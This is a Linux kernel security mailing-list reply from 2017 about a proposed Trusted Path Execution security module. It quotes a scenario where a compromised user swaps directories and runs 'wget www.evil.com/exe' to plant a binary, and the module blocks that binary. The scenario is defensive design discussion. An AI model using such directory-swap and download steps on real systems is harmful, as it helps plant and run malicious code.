From: gnomes@lxorguk.ukuu.org.uk (Alan Cox)
Date: Thu, 8 Jun 2017 20:23:31 +0100
Subject: [PATCH v2 0/1] Add Trusted Path Execution as a stackable LSM
In-Reply-To: <3f9e53a8-87d2-9773-d30b-64b89da8f3ff@nmatt.com>
References: <20170608034349.31876-1-matt@nmatt.com>
	<20170608193719.2d9e8d17@lxorguk.ukuu.org.uk>
	<3f9e53a8-87d2-9773-d30b-64b89da8f3ff@nmatt.com>
Message-ID: <20170608202331.285c4a8b@lxorguk.ukuu.org.uk>
To: linux-security-module@vger.kernel.org
List-Id: linux-security-module.vger.kernel.org

> So actually in this LSM it's not so much full paths that are trusted,
> rather it checks that the directory containing the program is only
> writable by root and that the program itself is only writable by root.
> 
> For example, consider the following:
> 
> /user/ with permissions drwxr-xr-x user user
> /user/user-owned/ with permissions drwxr-xr-x user user
> /user/user-owned/root-owned/ with permissions drwxr-xr-x root root
> /user/user-owned/root-owned/exe with permissions -rwxr-xr-x root root
> 
> currently /user/user-owned/root-owned/exe is trusted because it can only
> be written to by root, and the directory it is in can only be written by
> root.
> 
> but then user becomes compromised and does the following:
> cd /user/
> mv user-owned user-owned-back
> mkdir -p user-owned/root-owned
> cd user-owned/root-owned
> wget www.evil.com/exe
> 
> Now /user/user-owned/root-owned/exe is untrusted and its execution will
> be denied unless you put user in the trusted group.

I can cause a lot of mischief just by renaming commands (mv cp rm
does't work on must implementations) but yes the root directory check
itself should avoid that you are correct.

--
To unsubscribe from this list: send the line "unsubscribe linux-security-module" in
the body of a message to majordomo at vger.kernel.org
More majordomo info at  http://vger.kernel.org/majordomo-info.html
